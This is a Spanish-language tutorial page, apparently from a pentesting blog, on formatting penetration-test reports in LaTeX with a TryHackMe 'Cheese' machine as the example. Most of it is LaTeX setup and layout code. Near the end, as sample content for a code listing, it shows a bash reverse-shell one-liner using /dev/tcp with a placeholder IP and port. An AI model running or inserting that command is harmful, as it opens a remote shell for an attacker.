---
title: Redacción De Informes 
published : Trues
---
<div class="contenedor">
    <img src="imgs/redaccionDeInformes/portada.png" width="160" alt="Cheese logo">
    <div>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Desarrollo De Informes En Latex.</p>
    </div>
</div>

<center><font color="red">#</font>La Importancia De Elaborar Informes En El Pentesting</center>

> La elaboración de informes de pentesting es fundamental para comunicar los hallazgos de manera clara y efectiva. A continuación se detallan las razones más importantes de su relevancia, haciendo énfasis en la legibilidad y la estética.

* Documentación de Vulnerabilidades Identificadas

> Un informe bien estructurado documenta todas las vulnerabilidades descubiertas, lo que permite a la empresa tener un registro claro y comprensible. La legibilidad es clave aquí, ya que un informe confuso puede dificultar la identificación de problemas críticos.

* Análisis de Impacto y Riesgo

> La presentación clara de la información sobre el impacto y el riesgo de cada vulnerabilidad es crucial. Un diseño estético, con gráficos y tablas, puede facilitar la comprensión de datos complejos, permitiendo a los responsables de la toma de decisiones entender rápidamente las implicaciones de las vulnerabilidades.

* Recomendaciones de Mitigación

> Las recomendaciones deben ser concisas y visualmente atractivas. Utilizar listas numeradas o viñetas facilita la lectura y permite que el equipo de seguridad implemente soluciones adecuadas de manera eficiente.

* Cumplimiento Normativo

> Un informe bien diseñado no solo es más atractivo visualmente, sino que también ayuda a demostrar cumplimiento con las normativas. La legibilidad del informe es esencial para que los auditores comprendan rápidamente las acciones realizadas.

* Concientización y Formación

> La estética del informe puede hacer que la información sobre vulnerabilidades y métodos de ataque sea más accesible y atractiva para el personal. Un diseño limpio y visualmente atractivo puede aumentar la participación en sesiones de formación y Concientización.

* Mejora Continua

> La legibilidad y la estética contribuyen a la efectividad del informe en el proceso de mejora continua. Un informe claro y visualmente agradable facilita la identificación de patrones y áreas que necesitan atención, lo que permite ajustes en las políticas de seguridad de manera más efectiva.

---
<br>
<center><font color="red">#</font> Elaboración de informes con Latex.</center>

* LaTeX es una herramienta ampliamente utilizada para la redacción de informes profesionales debido a su capacidad de generar documentos con una calidad tipográfica superior. Ofrece un control preciso sobre el formato y facilita el manejo de elementos complejos como ecuaciones matemáticas, gráficos y referencias bibliográficas. La consistencia visual y la automatización de tareas, como la creación de tablas de contenido y referencias cruzadas, aseguran una presentación pulida y sin errores. La flexibilidad de LaTeX permite personalizar detalles del diseño, lo que da como resultado un informe altamente profesional, ideal para entornos académicos y técnicos.


<br>
<center># Instalación.</center>
* Para comenzar vamos a instalar todas las dependecias a utilizar.
```bash
 sudo apt-get install text-live-full zathura latexmk rubber -y --fix-missing
```
>
<img src="imgs/redaccionDeInformes/Cheese0.png">

* Compilación de texto .tex a .pdf
> latexmk -pdf Documento.tex
>
<img src="imgs/redaccionDeInformes/Cheese1.png">


* Para la visualización del documento pdf usamos zathura.
> zathura Documento.pdf
>
<img src="imgs/redaccionDeInformes/Cheese2.png">


* Para poder ver el Documento.tex en tiempo real y poder editarlo a la vez.
> latexmk -pdf -pvc Documento.tex
>
<img src="imgs/redaccionDeInformes/Cheese3.png">

<br>
<center># Comenzando</center> 
<br>
<h3># Declaración de plantilla en el documento .text</h3>
```tex
\documentclass[a4paper]{article} % Plantilla
```
<h3># Importación de paquetes. </h3>

```tex
\usepackage[utf8]{inputenc} % Codifica el archivo en utf-8.
\usepackage[spanish]{babel} % Declaración de idioma.
\usepackage{graphicx} % inserción de imágenes.  
\usepackage[table,xcdraw]{xcolor} % Definicion De Colores.
\usepackage[most]{tcolorbox} % Para importación de cuadros.
\usepackage[margin=2cm]{geometry} % Margen del informe en general.
\usepackage{fancyhdr} % Define el Estilo de la pagina.
\usepackage[hidelinks]{hyperref} % Gestión de hipervínculos.
\usepackage{parskip} % Arreglo de la tabulacion del documento.\
\usepackage[figurename=c3lis]{caption} % Cambiar el nombre del caption de las fotos.
\usepackage{smartdiagram} % Para el insertado de diagramas.
\usepackage{listing} % Para la inserción de código en el documento.
\usepackage{zed-csp} % Para la inserción de esquemas.

```

<h3># Declaracion de colores,variables etc.</h3>

```tex

% Declaración de colores
\definecolor{green}{HTML}{CF010B}
\definecolor{black}{HTML}{000000}
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}


% Declaración de variables.
%Imagenes.
\newcommand{\logMachine}{img/logCheese.jpg}
\newcommand{\logo}{img/tryhackme_log.png}
%Variables de entorno.
\newcommand{\machineName}{Cheese} % Nombre de la maquina.
\newcommand{\startDate}{7 De Octubre Del 2024}


%Adicionales
\addto\captionsspanish{\renewcommand{\contentsname}{Index}}% Cambia la variable por defecto del indice.
\setlength{\headheight}{80pt}
\pagestyle{fancy}
\fancyhf{}
\lhead{\includegraphics[width=4cm]{\logo}}\rhead{\includegraphics[height=3cm,keepaspectratio]{\logMachine}}
\renewcommand{\headrulewidth}{3pt}
\renewcommand{\headrule}{\hbox to\headwidth{\color{green}\leaders\hrule height \headrulewidth\hfill}}% Cambie el color de la lineas del indice.\renewcommand{\lstlistingname}{codigo} % Para cambiar los captions de los. codigos.



\lstdefinestyle{mystyle}{ % Estilo tras la importación de un cuadro
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2

```

<h3># Comiendo de un documento. [!] Cabe aclarar que para la creacion de cuadros esquemas etc se tiene que hacer uso de la paqueteria escrita anteriormente.</h3>

```tex

\begin{document}
    \cfoot{\thepage}


% Creacion de la portada.

		\begin{titlepage}
		\center

		\includegraphics[width=0.5\textwidth]{\logo}\par\vspace{1cm}
		{\scshape\LARGE\textbf{Informe Tecnico.}\par\vspace{0.3cm}}
		{\Huge\bfseries\textcolor{green}{Maquina \machineName}}\par

		\vfill\vfill % Para usar los espacios de la hoja
		\includegraphics[width=\textwidth,height=10cm,keepaspectratio]{\logMachine}\par\vspace{1cm} % Incluir imaganes al texto.
		\vfill
		\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black] % Creacion de cuadro.
		    \center
		    \LARGE{Este documento es confidencial y contiene informacion sensible.\\Esta informacion no deberia compartirse con terceros.}
		\end{tcolorbox}
		\vfill % Para usar los espacios de la hoja.
		{\large\startDate\par}
		\vfill % Para usar los espacios de la hoja.
		\end{titlepage}

\end{document} % Finalizar el documento.

```

<h3># Agregar un texto centrado, grande con negrita, principal uso para la portada.</h3>
```tex
{\scshape\LARGE\textbf{Informe Tecnico.}\par\vspace{0.3cm}
```
>
<img src="imgs/redaccionDeInformes/Cheese9.png">

<br>

<h3># Creacion de titulos, principal uso para la portada.</h3>
```texdisplay
{\Huge\bfseries\textcolor{green}{Maquina \machineName}}\par
```
>
<img src="imgs/redaccionDeInformes/Cheese10.png">

<br>

<h3># Crea el estilo del encabezado de cada hoja, en este caso son dos imagenes las cuales serian de la empresa destino y tu empresa.</h3>
```tex
% Este formato se tiene que incluir en variables de entorno es decir abajo de la importacion de la paqueteria.
\lhead{\includegraphics[width=4cm]{\logo}}\rhead{\includegraphics[height=3cm,keepaspectratio]{\logMachine}}
```
>
<img src="imgs/redaccionDeInformes/Cheese16.png">

<br>

<h3># Crea un indice.</h3>
```tex
\clearpage % Salta a la siguiente hoja para poder crear el indice.
\tableofcontents  % Crea la tabla de contenido "Indice".
\clearpage % Salta de hoja para comenzar con el texto.
```
>
<img src="imgs/redaccionDeInformes/Cheese13.png">

<br>
<h3># Incluir imagenes a un texto.</h3>
```tex
\includegraphics[width=\textwidth,height=10cm,keepaspectratio]{\logMachine}\par\vspace{1cm}
```
>
<img src="imgs/redaccionDeInformes/Cheese11.png">

<br>
<h3># Modifica el texto debajo de la imagen.</h3>
```tex
\caption{Detalles de la maquina.} 
```
>
<img src="imgs/redaccionDeInformes/Cheese15.png">

<br>

<h3># Ocuapar todos los epacios en la hoja restantes, generalmente se usa para la portada.</h3>
```tex
\vfill % Para usi de los espacios de la hoja.
```

<h3># Hacer un spaciado.</h3>
```tex
\vspace{0.5cm} % Espaciado de 0.5 centímetros
```

<h3># Creacion de un cuadro.</h3>
```text
\begin{tcolorbox}[colback=red!5!white,colframe=red!75!black] % Creacion de cuadro.
    \center
    \LARGE{Este documento es confidencial y contiene informacion sensible.\\Esta informacion no deberia compartirse con terceros.} % Importar texto
\end{tcolorbox}
```
>
<img src="imgs/redaccionDeInformes/Cheese12.png">

<br>
<h3># Agrega la fecha, dia y mes. Principal uso para la parte final de la portada.</h3>
```tex
{\large\startDate\par}
```
>
<img src="imgs/redaccionDeInformes/Cheese14.png">

<br>

<h3># Centrar un texto.</h3>
```tex
\center
````


<h3># Saltar a la nueva pagina</h3>
```text
% Comienzo del TOC
\clearpage
\tableofcontents
\clearpage

```
<h3># Crear una sección.</h3>
```text
\section{Antecedentes}
```
>
<img src="imgs/redaccionDeInformes/Cheese4.png">

<br>
<h3># Crear una subseccion.</h3>
```text
\subsection {Nueva subseccion.}
```
>
<img src="imgs/redaccionDeInformes/Cheese5.png">

<br>
<h3># Importacion de redireccion url.</h3>

```text
{machineName} \href{https://tryhackme.com}{\textbf{\color{blue} Redireccion aqui. }}.
```
<h3># Inserción de una figura</h3>
```tex
\begin{figure}[h]
\begin{center}
\smartdiagram[priority descriptive diagram]{
Reconocimiento sobre el sistema,
Explotacion de vulnerabilidades,
Exploracion del sistema,
Securizacion del sistema.
}
\end{center}
\end{figure}
```
>
<img src="imgs/redaccionDeInformes/Cheese6.png">

<br>

<h3># Creacion de un esquema.</h3>
```tex
\begin{schema}{TCP}
Puertos\tableofcontents
\where
22, 80, 4444
\end{schema}
```
>
<img src="imgs/redaccionDeInformes/Cheese7.png">

<br>
<h3># Crear una seccion para un codigo.</h3>
```tex
/bin/bash -i >& /dev/tcp/{Ip}/{Puerto} 0>&1
```
>
<img src="imgs/redaccionDeInformes/Cheese8.png">


<br>
<h3># Descarga el pdf final, como ejemplo base.</h3>
<a href="files/Documento.pdf" download>Descargar PDF</a>

<h3># Descarga el archivo Documento.tex usado para la compilacion del pdf anterior.</h3>
<a href="files/Documento.tex" download>Descargar tex</a>

